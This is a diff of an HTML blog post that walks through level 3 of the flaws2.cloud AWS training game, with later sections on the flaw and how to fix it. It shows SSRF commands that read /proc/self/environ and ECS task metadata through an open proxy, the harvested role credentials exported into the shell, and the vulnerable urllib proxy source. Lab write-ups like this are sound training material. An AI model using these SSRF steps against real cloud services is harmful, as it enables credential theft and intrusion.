@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.56.3" />
+    <meta name="generator" content="Hugo 0.64.1" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title> | text/plain</title>
     <meta name="description" content="Level 3 Exploring the proxy We can use the proxy to request more or less any website (HTTP only). Confirm with icanhazip.com, which reflects the requesters IP. For the proxy it is &ldquo;3.85.224.200&rdquo;:
-root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/ HTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Fri, 22 Nov 2019 08:36:56 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive 3.85.224.200  This is indeed the public IP of the proxy:
-root@215d97a11044:/# dig container.">
+root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/ HTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Fri, 22 Nov 2019 08:36:56 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive 3.85.224.200 This is indeed the public IP of the proxy:
+root@215d97a11044:/# dig container.target.flaws2.cloud ... container.">
     <meta name="keywords" content="aws, hackthebox, misc, steganography, ">
     
     
@@ -20,12 +20,11 @@ root@215d97a11044:/# dig container.">
 
     <meta property="og:title" content="" />
 <meta property="og:description" content="Level 3 Exploring the proxy We can use the proxy to request more or less any website (HTTP only). Confirm with icanhazip.com, which reflects the requesters IP. For the proxy it is &ldquo;3.85.224.200&rdquo;:
-root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/ HTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Fri, 22 Nov 2019 08:36:56 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive 3.85.224.200  This is indeed the public IP of the proxy:
-root@215d97a11044:/# dig container." />
+root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/ HTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Fri, 22 Nov 2019 08:36:56 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive 3.85.224.200 This is indeed the public IP of the proxy:
+root@215d97a11044:/# dig container.target.flaws2.cloud ... container." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://dominicbreuker.com/post/22_flaws2_cloud_3/" />
-
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 
 
     
@@ -225,17 +224,15 @@ figure a:hover {
   <article itemscope itemtype="http://schema.org/BlogPosting">
     <meta itemprop="name" content="">
 <meta itemprop="description" content="Level 3 Exploring the proxy We can use the proxy to request more or less any website (HTTP only). Confirm with icanhazip.com, which reflects the requesters IP. For the proxy it is &ldquo;3.85.224.200&rdquo;:
-root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/ HTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Fri, 22 Nov 2019 08:36:56 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive 3.85.224.200  This is indeed the public IP of the proxy:
-root@215d97a11044:/# dig container.">
-
-
+root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/ HTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Fri, 22 Nov 2019 08:36:56 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive 3.85.224.200 This is indeed the public IP of the proxy:
+root@215d97a11044:/# dig container.target.flaws2.cloud ... container.">
 
 <meta itemprop="wordCount" content="998">
+<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 
 
 
 <meta itemprop="keywords" content="" />
-
     <script async src="/js/baffle.js"></script>
     <header>
       <h1 class="baffle" itemprop="headline"></h1>
@@ -258,16 +255,11 @@ root@215d97a11044:/# dig container.">
     
 
     <div itemprop="articleBody">
-      
-
-<h1 id="level-3">Level 3</h1>
-
+      <h1 id="level-3">Level 3</h1>
 <h2 id="exploring-the-proxy">Exploring the proxy</h2>
-
 <p>We can use the proxy to request more or less any website (HTTP only).
 Confirm with <a href="http://icanhazip.com">icanhazip.com</a>, which reflects the
 requesters IP. For the proxy it is &ldquo;3.85.224.200&rdquo;:</p>
-
 <pre><code>root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/
 HTTP/1.1 200 OK
 Server: nginx/1.10.3 (Ubuntu)
@@ -277,23 +269,16 @@ Transfer-Encoding: chunked
 Connection: keep-alive
 
 3.85.224.200
-</code></pre>
-
-<p>This is indeed the public IP of the proxy:</p>
-
+</code></pre><p>This is indeed the public IP of the proxy:</p>
 <pre><code>root@215d97a11044:/# dig container.target.flaws2.cloud
 ...
 container.target.flaws2.cloud. 377 IN   A       3.85.224.200
 ...
-</code></pre>
-
-<h2 id="accessing-task-metadata">Accessing task metadata</h2>
-
+</code></pre><h2 id="accessing-task-metadata">Accessing task metadata</h2>
 <p>This looks remarkably similar to level 5 of <a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">flaws.cloud</a>.
 In that level, an EC2 machine hosts a proxy.
 It can be compromised by accessing the instance metadata service.
 Why not just try the same thing here:</p>
-
 <pre><code>root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/169.254.169.254/latest/
 HTTP/1.1 200 OK
 Server: nginx/1.10.3 (Ubuntu)
@@ -301,14 +286,11 @@ Date: Fri, 22 Nov 2019 08:33:44 GMT
 Content-Type: text/html
 Transfer-Encoding: chunked
 Connection: keep-alive
-</code></pre>
-
-<p>Sad, no output. Why is that?
+</code></pre><p>Sad, no output. Why is that?
 In ECS there is a similar but slightly different thing called task metadata service, as documented <a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint.html">here</a>.
 Interestingly, there also seems to be a metadata file, but that won&rsquo;t help
 us in this level too much (<a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/container-metadata.html">further reading</a>).
 Two possible versions:</p>
-
 <ul>
 <li><a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html">Version 2</a>:
 is very similar to the instance metadata service of EC2 machines.
@@ -321,59 +303,52 @@ The URI is exposed to the container in the &ldquo;ECS_CONTAINER_METADATA_URI&rdq
 environment variable. This adds an additional layer of defense.
 Better hope that version 2 works.</li>
 </ul>
-
 <p>Try version 2 by requesting <code>curl -s http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/metadata/ | jq</code>.
 The output is a pretty JSON with all the details. Here is parts of it:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-json" data-lang="json"><span></span><span style="color: #f8f8f2">{</span>
-  <span style="color: #f92672">&quot;Cluster&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;arn:aws:ecs:us-east-1:653711331788:cluster/level3&quot;</span><span style="color: #f8f8f2">,</span>
-  <span style="color: #f92672">&quot;TaskARN&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;arn:aws:ecs:us-east-1:653711331788:task/5782c64d-114b-4c40-8c14-06d59ca07797&quot;</span><span style="color: #f8f8f2">,</span>
-  <span style="color: #f92672">&quot;Family&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;level3&quot;</span><span style="color: #f8f8f2">,</span>
-  <span style="color: #f92672">&quot;Revision&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;3&quot;</span><span style="color: #f8f8f2">,</span>
-  <span style="color: #f92672">&quot;DesiredStatus&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;RUNNING&quot;</span><span style="color: #f8f8f2">,</span>
-  <span style="color: #f92672">&quot;KnownStatus&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;RUNNING&quot;</span><span style="color: #f8f8f2">,</span>
-  <span style="color: #f92672">&quot;Containers&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">[</span>
-    <span style="color: #f8f8f2">{</span>
-      <span style="color: #f92672">&quot;DockerId&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;55c3211baa020d5e766172e2bd690a1e38ff28d44d4aff7bb42906c0033b25ba&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Name&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;~internal~ecs~pause&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;DockerName&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;ecs-level3-3-internalecspause-acfae1d980e58decd801&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Image&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;fg-proxy:tinyproxy&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;ImageID&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #960050; background-color: #1e0010">...</span>
-    <span style="color: #f8f8f2">},</span>
-    <span style="color: #f8f8f2">{</span>
-      <span style="color: #f92672">&quot;DockerId&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;e858669ed741177c7d316cb6c686090dbd6d6fd75e2d98181bac4dc5847e0710&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Name&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;level3&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;DockerName&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;ecs-level3-3-level3-a8cf8fd0fd9ccea51300&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Image&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;653711331788.dkr.ecr.us-east-1.amazonaws.com/level2&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #960050; background-color: #1e0010">...</span>
-    <span style="color: #f8f8f2">}</span>
-  <span style="color: #f8f8f2">],</span>
-  <span style="color: #960050; background-color: #1e0010">...</span>
-<span style="color: #f8f8f2">}</span>
-</code></pre></div>
-
-<p>So we do have an <a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task_definitions.html">ECS task</a>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;Cluster&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:ecs:us-east-1:653711331788:cluster/level3&#34;</span>,
+  <span style="color:#f92672">&#34;TaskARN&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:ecs:us-east-1:653711331788:task/5782c64d-114b-4c40-8c14-06d59ca07797&#34;</span>,
+  <span style="color:#f92672">&#34;Family&#34;</span>: <span style="color:#e6db74">&#34;level3&#34;</span>,
+  <span style="color:#f92672">&#34;Revision&#34;</span>: <span style="color:#e6db74">&#34;3&#34;</span>,
+  <span style="color:#f92672">&#34;DesiredStatus&#34;</span>: <span style="color:#e6db74">&#34;RUNNING&#34;</span>,
+  <span style="color:#f92672">&#34;KnownStatus&#34;</span>: <span style="color:#e6db74">&#34;RUNNING&#34;</span>,
+  <span style="color:#f92672">&#34;Containers&#34;</span>: [
+    {
+      <span style="color:#f92672">&#34;DockerId&#34;</span>: <span style="color:#e6db74">&#34;55c3211baa020d5e766172e2bd690a1e38ff28d44d4aff7bb42906c0033b25ba&#34;</span>,
+      <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;~internal~ecs~pause&#34;</span>,
+      <span style="color:#f92672">&#34;DockerName&#34;</span>: <span style="color:#e6db74">&#34;ecs-level3-3-internalecspause-acfae1d980e58decd801&#34;</span>,
+      <span style="color:#f92672">&#34;Image&#34;</span>: <span style="color:#e6db74">&#34;fg-proxy:tinyproxy&#34;</span>,
+      <span style="color:#f92672">&#34;ImageID&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+      <span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span>
+    },
+    {
+      <span style="color:#f92672">&#34;DockerId&#34;</span>: <span style="color:#e6db74">&#34;e858669ed741177c7d316cb6c686090dbd6d6fd75e2d98181bac4dc5847e0710&#34;</span>,
+      <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;level3&#34;</span>,
+      <span style="color:#f92672">&#34;DockerName&#34;</span>: <span style="color:#e6db74">&#34;ecs-level3-3-level3-a8cf8fd0fd9ccea51300&#34;</span>,
+      <span style="color:#f92672">&#34;Image&#34;</span>: <span style="color:#e6db74">&#34;653711331788.dkr.ecr.us-east-1.amazonaws.com/level2&#34;</span>,
+      <span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span>
+    }
+  ],
+  <span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">.</span>
+}
+</code></pre></div><p>So we do have an <a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task_definitions.html">ECS task</a>
 with two containers. One is based on the &ldquo;level2&rdquo; image we found in the
 previous level. Based on its name, the other seems to be running <a href="https://tinyproxy.github.io/">tinyproxy</a>.
 I suspect this is a container used by ECS internally to provide the &ldquo;awsvpc&rdquo;
 networking mode, so we should not care about it too much (compare <a href="https://aws.amazon.com/blogs/compute/under-the-hood-task-networking-for-amazon-ecs/">ECS internals</a>).</p>
-
 <p>So far so good, but how do we get at the credentials? The documentations does
 not say anything about that. My first try was to go to the same endpoint used
 in the instance metadata service. For example, try appending &ldquo;/iam/info&rdquo;.
 Unfortunately, we will only get &ldquo;Unable to generate metadata &hellip;&rdquo; responses
 back.</p>
-
 <p>Have a look at the <a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html">ECS developer documentation</a>
 instead. It contains all the details about ECS, including how to get the
 credentials. In there we learn that the endpoint for credentials is dynamic and
 stored in the environment variable &ldquo;AWS_CONTAINER_CREDENTIALS_RELATIVE_URI&rdquo;.
 Uh oh, we are back to reading environment variables.</p>
-
 <p>TODO: check source of proxy to see if file protocol is supported.
 Now we just make a request against &ldquo;/proc/self/environ&rdquo;, where Linux exposes
 all environment variables of the current process in form of a file.</p>
-
 <pre><code> # curl --output - http://container.target.flaws2.cloud/proxy/file:///proc/self/environ
 HOSTNAME=ip-172-31-56-11.ec2.internal
 HOME=/root
@@ -383,12 +358,9 @@ AWS_ECS_FARGATEAWS_DEFAULT_REGION=us-east-1
 ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/c88043c3-94ac-4650-a13f-1c15293a5a31PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 AWS_REGION=us-east-1
 PWD=/
-</code></pre>
-
-<p>If you do there request you will notice there are no line breaks.
+</code></pre><p>If you do there request you will notice there are no line breaks.
 I&rsquo;ve added them above for readability.
 Now we know where to go for the credentials:</p>
-
 <pre><code> # curl -s http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/9c3439c4-b560-4aac-aa62-f904a24a34e6 | jq
 {
   &quot;RoleArn&quot;: &quot;arn:aws:iam::653711331788:role/level3&quot;,
@@ -397,10 +369,7 @@ Now we know where to go for the credentials:</p>
   &quot;Token&quot;: &quot;FwoGZXIvYXdzEOv//////////wEaDGW1cqeLZ64imCuCBiLgAmsez/FXqR1kaG7vmFZPggaqblIeIZiJ+p+dCJJawIIKFyzM9sfkjtyeV12rGd/58eNNnASObJmC+UHceizhBo8PbthNkHM8FMptzFBUeo/fwqRFCSw8L/kLENn8I7NpiO9ek2DcrEATysZDyuzWve4xBF82PKgOZn2cCErC0y0XGa/UgXlZUM/NgzmqrLSC9SSndReqhU5BLWrcoknzdkTDBu1HRUvs3vLaftsPBcdmNd50B8lN8Jh4EfiZVc3ECo3SZ10xosHXVWmHBZsHcLBPMlDMLvLxZeXryVWrVKMYSWGiWSCZjtrdelZFMBmBS+v7W47i1DMjPZrsoV/pri0TfvpIvFfGW18Th+UQV9NHEi+Al5wmbVRY5JUVUlVvoDLduyutIAMCWqrIemATzs/U4KlYsmI1JSEckmnerqv8J7qjficigWi397P8yuVMrFYiC/l94JeOQWB/TEnCHEUoqN3e7gUyngG+3xenII8s9CTX+jwytMBwdfyHY+2uSB1ez8AxpsL4kDrfIodIXzBE6UuWnwMYEKfhx7m/1L801OP2epDT2zOJQbYeRlxZiFBMomKYB2s0PPyuSIJbTY6BcDrjMaGryE9A+9tSJVkbFA42NuVkHUyT2AMkje69q/C6xzxX0+Wkts+DaqOnnIKjPpZBVEACSoWk6FJeGHF6ePP5gpoi4w==&quot;,
   &quot;Expiration&quot;: &quot;2019-11-22T15:47:20Z&quot;
 }
-</code></pre>
-
-<p>As usual, configure credentials and verify if it works:</p>
-
+</code></pre><p>As usual, configure credentials and verify if it works:</p>
 <pre><code> # export AWS_ACCESS_KEY_ID=ASIAZQNB3KHGBGREZRZ4
  # export AWS_SECRET_ACCESS_KEY=Bq9AnAFihjdau4tbb4l1KrIzifXzhWdVlBdIH89c
  # export AWS_SESSION_TOKEN=FwoGZXIvYXdzEOv//////////wEaDGW1cqeLZ64imCuCBiLgAmsez/FXqR1kaG7vmFZPggaqblIeIZiJ+p+dCJJawIIKFyzM9sfkjtyeV12rGd/58eNNnASObJmC+UHceizhBo8PbthNkHM8FMptzFBUeo/fwqRFCSw8L/kLENn8I7NpiO9ek2DcrEATysZDyuzWve4xBF82PKgOZn2cCErC0y0XGa/UgXlZUM/NgzmqrLSC9SSndReqhU5BLWrcoknzdkTDBu1HRUvs3vLaftsPBcdmNd50B8lN8Jh4EfiZVc3ECo3SZ10xosHXVWmHBZsHcLBPMlDMLvLxZeXryVWrVKMYSWGiWSCZjtrdelZFMBmBS+v7W47i1DMjPZrsoV/pri0TfvpIvFfGW18Th+UQV9NHEi+Al5wmbVRY5JUVUlVvoDLduyutIAMCWqrIemATzs/U4KlYsmI1JSEckmnerqv8J7qjficigWi397P8yuVMrFYiC/l94JeOQWB/TEnCHEUoqN3e7gUyngG+3xenII8s9CTX+jwytMBwdfyHY+2uSB1ez8AxpsL4kDrfIodIXzBE6UuWnwMYEKfhx7m/1L801OP2epDT2zOJQbYeRlxZiFBMomKYB2s0PPyuSIJbTY6BcDrjMaGryE9A+9tSJVkbFA42NuVkHUyT2AMkje69q/C6xzxX0+Wkts+DaqOnnIKjPpZBVEACSoWk6FJeGHF6ePP5gpoi4w==
@@ -410,23 +379,17 @@ Now we know where to go for the credentials:</p>
     &quot;Account&quot;: &quot;653711331788&quot;,
     &quot;Arn&quot;: &quot;arn:aws:sts::653711331788:assumed-role/level3/5782c64d-114b-4c40-8c14-06d59ca07797&quot;
 }
-</code></pre>
-
-<p>And again the usual game of trying out what we can do.
+</code></pre><p>And again the usual game of trying out what we can do.
 Similar to all the other levels we look for stuff in s3, so try this:</p>
-
 <pre><code>root@215d97a11044:/# aws s3 ls
 2018-11-20 19:50:08 flaws2.cloud
 2018-11-20 18:45:26 level1.flaws2.cloud
 2018-11-21 01:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
 2018-11-26 19:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
 2018-11-27 20:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
-</code></pre>
-
-<p>That was it. Go to
+</code></pre><p>That was it. Go to
 <a href="http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud">the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud</a>
 and watch the end of the game:</p>
-
 
 
 
@@ -463,80 +426,62 @@ and watch the end of the game:</p>
   }
 </style>
 
-
 <h1 id="the-flaw">The flaw</h1>
-
 <h2 id="secure-the-proxy">Secure the proxy</h2>
-
 <h2 id="review-application-code">Review application code</h2>
-
 <p>Since we know how to get files, get the proxy files out of the image (we could
 just look at the image we got from the previous level but this way it is
 cooler).</p>
-
 <p>Start by checking the cmdline of the process with PID 1, which should be the
 one the container was launched with:</p>
-
 <pre><code># curl --output - http://container.target.flaws2.cloud/proxy/file:///proc/1/cmdline
 sh/var/www/html/start.sh
-</code></pre>
-
-<p>Good, we now check out &ldquo;/var/www/html/start.sh&rdquo; to see what is going on:</p>
-
+</code></pre><p>Good, we now check out &ldquo;/var/www/html/start.sh&rdquo; to see what is going on:</p>
 <pre><code> # curl --output - http://container.target.flaws2.cloud/proxy/file:///var/www/html/start.sh
 #!/bin/bash
 python /var/www/html/proxy.py &amp;
-</code></pre>
-
-<p>That is a simple one. Now we are just a single call away from the source.
+</code></pre><p>That is a simple one. Now we are just a single call away from the source.
 Do <code>curl --output - http://container.target.flaws2.cloud/proxy/file:///var/www/html/proxy.py</code>
 to load the code:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-python" data-lang="python"><span></span><span style="color: #f92672">import</span> <span style="color: #f8f8f2">SocketServer</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">SimpleHTTPServer</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">urllib</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> SocketServer
+<span style="color:#f92672">import</span> SimpleHTTPServer
+<span style="color:#f92672">import</span> urllib
+<span style="color:#f92672">import</span> os
 
-<span style="color: #f8f8f2">PORT</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">8000</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">8000</span>
 
-<span style="color: #66d9ef">class</span> <span style="color: #a6e22e">Proxy</span><span style="color: #f8f8f2">(SimpleHTTPServer</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SimpleHTTPRequestHandler):</span>
-  <span style="color: #66d9ef">def</span> <span style="color: #a6e22e">do_GET</span><span style="color: #f8f8f2">(self):</span>
-    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send_response(</span><span style="color: #ae81ff">200</span><span style="color: #f8f8f2">)</span>
-    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send_header(</span><span style="color: #e6db74">&quot;Content-type&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot;text/html&quot;</span><span style="color: #f8f8f2">)</span>
-    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">end_headers()</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Proxy</span>(SimpleHTTPServer<span style="color:#f92672">.</span>SimpleHTTPRequestHandler):
+  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
+    self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
+    self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Content-type</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text/html</span><span style="color:#e6db74">&#34;</span>)
+    self<span style="color:#f92672">.</span>end_headers()
 
-    <span style="color: #75715e"># Remove starting slash</span>
-    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">path</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">path[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:]</span>
+    <span style="color:#75715e"># Remove starting slash</span>
+    self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>path[<span style="color:#ae81ff">1</span>:]
 
-    <span style="color: #75715e"># Read the remote site</span>
-    <span style="color: #f8f8f2">response</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">urllib</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlopen(self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">path)</span>
-    <span style="color: #f8f8f2">the_page</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">response</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">read(</span><span style="color: #ae81ff">8192</span><span style="color: #f8f8f2">)</span>
+    <span style="color:#75715e"># Read the remote site</span>
+    response <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>urlopen(self<span style="color:#f92672">.</span>path)
+    the_page <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">8192</span>)
 
-    <span style="color: #75715e"># Return it</span>
-    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">wfile</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">write(bytes(the_page))</span>
-    <span style="color: #f8f8f2">self</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">wfile</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
+    <span style="color:#75715e"># Return it</span>
+    self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(bytes(the_page))
+    self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>close()
 
-<span style="color: #f8f8f2">httpd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">SocketServer</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">ForkingTCPServer((</span><span style="color: #e6db74">&#39;&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">PORT),</span> <span style="color: #f8f8f2">Proxy)</span>
-<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;serving at port&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">PORT</span>
-<span style="color: #f8f8f2">httpd</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">serve_forever()</span>
-</code></pre></div>
-
-<p>Here we can see that the developer intended to make a proxy just for HTTP GET
+httpd <span style="color:#f92672">=</span> SocketServer<span style="color:#f92672">.</span>ForkingTCPServer((<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>, PORT), Proxy)
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">serving at port</span><span style="color:#e6db74">&#34;</span>, PORT
+httpd<span style="color:#f92672">.</span>serve_forever()
+</code></pre></div><p>Here we can see that the developer intended to make a proxy just for HTTP GET
 requests but uses &ldquo;urllib.urlopen&rdquo; on whatever the string is that the user
 supplies. No matter the Python version, this function supports other schemes
 besides HTTP (see <a href="https://docs.python.org/2/library/urllib.html">Python2</a> and
 <a href="https://docs.python.org/3/library/urllib.request.html">Python3</a> docs).</p>
-
 <p>The code also confirms that no HTTP method other than GET is supported.
 &ldquo;urllib.urlopen&rdquo; makes GET requests by default, optionally POST
 requests if an additional argument like <code>data=&quot;param=value&quot;</code> is provided.
 The code snippet at hand passes no such argument. Thus there is nothing we can do.</p>
-
 <h2 id="least-privilege">Least privilege</h2>
-
 <p>Do not give the container access to S3 if not needed.</p>
-
 <h1 id="conclusion">Conclusion</h1>
-
 <p>Same issue again but more difficult to use this time.
 AWS is working hard to mitigate this stuff.</p>
 
